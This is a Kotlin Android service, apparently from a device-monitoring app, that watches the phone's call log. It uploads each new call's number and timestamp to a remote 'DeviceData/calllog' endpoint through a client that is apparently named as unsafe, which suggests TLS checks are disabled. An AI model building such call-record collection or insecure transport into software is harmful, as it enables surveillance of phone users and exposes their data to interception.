package com.example.bullsseeclient.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.CallLog
import android.database.Cursor
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.HandlerThread
import androidx.core.app.NotificationCompat
import com.example.bullsseeclient.HttpClient
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.time.Instant

class SmsCallMonitorService : Service() {
    private var observerThread: HandlerThread? = null
    private var callLogObserver: ContentObserver? = null
    private var lastSentId: Long = -1L
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        android.util.Log.d("SmsCallMonitorService", "onCreate")
        startForeground()
        observerThread = HandlerThread("CallLogObserver").also { it.start() }
        val handler = Handler(observerThread!!.looper)
        callLogObserver = object : ContentObserver(handler) {
            override fun onChange(selfChange: Boolean) {
                onChange(selfChange, null)
            }
            override fun onChange(selfChange: Boolean, uri: Uri?) {
                processLatestCall()
            }
        }
        contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, callLogObserver!!)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("SmsCallMonitorService", "onStartCommand")
        return START_STICKY
    }

    private fun startForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("CALL_MONITOR", "Call Monitor", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        val notification: Notification = NotificationCompat.Builder(this, "CALL_MONITOR")
            .setContentTitle("Call Monitor")
            .setContentText("Monitoring calls")
            .setSmallIcon(android.R.drawable.stat_sys_phone_call)
            .build()
        startForeground(1001, notification)
    }

    private fun sendCallEventFromLog(number: String?, date: Long) {
        android.util.Log.d("SmsCallMonitorService", "sendCallEventFromLog number=$number date=$date")
        val retrofit = Retrofit.Builder()
            .baseUrl(HttpClient.BASE_URL)
            .addConverterFactory(GsonConverterFactory.create())
            .client(HttpClient.getUnsafeOkHttpClient())
            .build()
        val api = retrofit.create(Api::class.java)
        val payload = listOf(CallDto(number = number, date = date))
        val body = RequestBody.create("application/json".toMediaType(), com.google.gson.Gson().toJson(payload))
        api.send(body).enqueue(object : retrofit2.Callback<Void> {
            override fun onResponse(call: retrofit2.Call<Void>, response: retrofit2.Response<Void>) {
                android.util.Log.d("SmsCallMonitorService", "upload status=${response.code()}")
            }
            override fun onFailure(call: retrofit2.Call<Void>, t: Throwable) {
                android.util.Log.e("SmsCallMonitorService", "upload error=${t.message}")
            }
        })
    }

    

    private fun processLatestCall() {
        val uri = CallLog.Calls.CONTENT_URI
        val projection = arrayOf(CallLog.Calls._ID, CallLog.Calls.NUMBER, CallLog.Calls.DATE)
        val sortOrder = CallLog.Calls.DATE + " DESC"
        var cursor: Cursor? = null
        try {
            cursor = contentResolver.query(uri, projection, null, null, sortOrder)
            if (cursor != null && cursor.moveToFirst()) {
                val id = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls._ID))
                val number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                val date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE))
                if (id != lastSentId) {
                    lastSentId = id
                    sendCallEventFromLog(number, date)
                }
            }
        } catch (e: SecurityException) {
            android.util.Log.e("SmsCallMonitorService", "READ_CALL_LOG not granted: ${e.message}")
        } catch (e: Exception) {
            android.util.Log.e("SmsCallMonitorService", "CallLog observer query error: ${e.message}")
        } finally {
            cursor?.close()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        if (callLogObserver != null) contentResolver.unregisterContentObserver(callLogObserver!!)
        observerThread?.quitSafely()
    }

    interface Api {
        @retrofit2.http.POST("api/DeviceData/calllog")
        fun send(@retrofit2.http.Body data: okhttp3.RequestBody): retrofit2.Call<Void>
    }

    data class CallDto(val number: String?, val date: Long)

    companion object {
        fun start(context: Context) {
            val intent = Intent(context, SmsCallMonitorService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent)
            else context.startService(intent)
        }
    }
}
